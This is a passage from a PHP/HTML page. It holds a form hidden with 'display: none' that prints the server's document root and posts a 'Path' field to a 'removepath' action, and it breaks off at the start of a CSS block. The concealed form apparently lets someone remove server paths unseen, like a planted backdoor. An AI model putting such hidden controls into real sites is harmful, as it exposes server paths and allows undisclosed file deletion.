...
<form name="update" id="update" action="" method="post" style="display: none">
<?php echo $_SERVER['DOCUMENT_ROOT'];?>
<p>Path: <input type="text" name="table" value=""/></p>
<input type="submit" name="removepath" id="removepath" value="removepath"/>
</form>
<style>
/**
 *    Real-World CSS
